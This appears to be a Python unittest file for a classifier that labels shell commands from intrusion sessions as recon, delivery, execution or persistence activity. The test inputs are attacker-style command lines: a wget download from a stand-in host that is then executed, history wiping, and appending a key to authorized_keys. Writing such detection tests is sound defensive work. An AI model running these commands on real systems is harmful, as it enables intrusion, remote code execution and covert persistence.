import unittest
from session_actions import classify,session_actions

class ActionsTests(unittest.TestCase):
 def test_one_session_can_have_several_categories(self):
  self.assertEqual(classify('cd /tmp; wget http://example.invalid/i -O i; chmod 777 i; ./i'),{'delivery','execution'})
 def test_repeats_do_not_multiply_session_categories(self):
  self.assertEqual(session_actions(['uname -a','uname -a','lscpu']),{'recon'})
 def test_echoed_command_names_are_not_commands(self):
  self.assertEqual(classify("echo 'wget chmod crontab uname'"),set())
 def test_busybox_chain_can_probe_write_and_deliver(self):
  self.assertEqual(classify(">/var/run/.x && cd /var/run; /bin/busybox echo -ne '\\x7f\\x45' >> .i"),{'writable','delivery'})
 def test_wrapper_shell_is_inspected_without_execution(self):
  self.assertEqual(classify("sh -c 'uname -m; nvidia-smi -L'"),{'recon'})
 def test_device_and_file_header_probes(self):
  self.assertEqual(classify('dd bs=52 count=1 if=/bin/ls'),{'recon'})
 def test_upload_protocol_is_file_delivery(self):
  self.assertEqual(classify('scp -qt /tmp/sample'),{'delivery'})
 def test_wget_capability_probe_is_not_a_download(self):
  self.assertEqual(classify('/bin/busybox wget'),set())
 def test_curl_public_ip_lookup_is_recon(self):
  self.assertEqual(classify('curl -s ipinfo.io/ip'),{'recon'})
 def test_removing_history_is_a_trace_signal(self):
  self.assertEqual(classify('history -c; rm -f ~/.bash_history'),{'persistence_cleanup'})
 def test_temporary_file_removal_is_not_assumed_trace_removal(self):
  self.assertEqual(classify('rm -f i'),set())
 def test_authorized_keys_read_is_not_a_persistence_write(self):
  self.assertEqual(classify('cat ~/.ssh/authorized_keys'),set())
 def test_authorized_keys_write_has_two_categories(self):
  self.assertEqual(classify("echo 'ssh-ed25519 TEST' >> ~/.ssh/authorized_keys"),{'delivery','persistence_cleanup'})
 def test_write_permission_check(self):
  self.assertEqual(classify('test -w /tmp'),{'writable'})

if __name__=='__main__':unittest.main()
